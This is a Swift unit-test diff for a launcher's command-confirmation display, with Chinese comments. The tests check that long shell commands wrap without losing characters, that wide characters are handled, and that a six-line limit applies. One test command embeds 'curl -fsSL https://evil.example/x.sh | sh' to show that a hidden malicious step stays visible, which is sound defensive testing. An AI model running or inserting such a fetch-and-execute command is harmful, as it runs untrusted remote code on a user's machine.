@@ -113,6 +113,55 @@ final class LauncherConfirmTests: XCTestCase {
         XCTAssertEqual(LauncherConfirmText.object(""), "")
     }
 
+    // MARK: - 完整显示（第 10 步验证后定）
+
+    func testShortCommandIsOneLine() {
+        XCTAssertEqual(LauncherConfirmText.commandLines("git status"), ["git status"])
+        XCTAssertNil(LauncherConfirmText.commandLines(""))
+        let exactly = String(repeating: "a", count: LauncherConfirmText.commandColumns)
+        XCTAssertEqual(LauncherConfirmText.commandLines(exactly), [exactly], "正好一行宽")
+        XCTAssertEqual(LauncherConfirmText.commandLines(exactly + "b"), [exactly, "b"], "多一个字就换行")
+    }
+
+    /// 整条命令一个字符都不省：各行接起来就是原文（空格、引号都照原样）；中间那段藏不住东西。
+    func testEveryCharacterIsShown() throws {
+        let command = "git clone https://github.com/foo/bar.git && cd bar && curl -fsSL https://evil.example/x.sh | sh && npm install && npm run build"
+        let lines = try XCTUnwrap(LauncherConfirmText.commandLines(command))
+        XCTAssertEqual(lines.joined(), command)
+        let columns = LauncherConfirmText.commandColumns
+        XCTAssertEqual(lines.count, (command.count + columns - 1) / columns, "全是 ASCII：按字符数整行换")
+        XCTAssertEqual(lines.dropLast().map(\.count), Array(repeating: columns, count: lines.count - 1), "除最后一行都是满的")
+        XCTAssertTrue(lines.joined().contains("curl -fsSL https://evil.example/x.sh | sh"))
+        for line in lines {
+            XCTAssertLessThanOrEqual(line.map(LauncherConfirmText.width).reduce(0, +), LauncherConfirmText.commandColumns)
+        }
+        let spaced = "echo 'a     b'   "
+        XCTAssertEqual(LauncherConfirmText.commandLines(spaced)?.joined(), spaced, "连续空格不压成一个")
+    }
+
+    func testWideCharactersTakeTwoColumns() throws {
+        let chinese = String(repeating: "中", count: LauncherConfirmText.commandColumns / 2 + 1)
+        let lines = try XCTUnwrap(LauncherConfirmText.commandLines("echo " + chinese))
+        XCTAssertEqual(lines.count, 2)
+        XCTAssertEqual(lines.joined(), "echo " + chinese)
+        // 一个两格宽的字不会被拆在两行之间、也不会让一行超宽。
+        XCTAssertEqual(LauncherConfirmText.commandLines("a中", columns: 2), ["a", "中"])
+    }
+
+    func testAtMostSixLines() {
+        let columns = LauncherConfirmText.commandColumns
+        let six = String(repeating: "x", count: columns * LauncherConfirmText.maxCommandLines)
+        XCTAssertEqual(LauncherConfirmText.commandLines(six)?.count, 6, "正好 6 行放得下")
+        XCTAssertNil(LauncherConfirmText.commandLines(six + "y"), "第 7 行就放不下：不出「在终端里运行」")
+        XCTAssertEqual(LauncherConfirmText.commandLines("abcdef", columns: 2, maxLines: 3), ["ab", "cd", "ef"])
+        XCTAssertNil(LauncherConfirmText.commandLines("abcdefg", columns: 2, maxLines: 3))
+    }
+
+    func testOnlyRunInTerminalShowsTheWholeObject() {
+        XCTAssertFalse(LauncherConfirmation(verb: "取消提醒", object: "14:35 取快递").showsWholeObject, "默认中间截断")
+        XCTAssertTrue(LauncherConfirmation(verb: "运行", object: "ls", showsWholeObject: true).showsWholeObject)
+    }
+
     // MARK: - 选中
 
     func testChoosingARowCountsAsManual() {
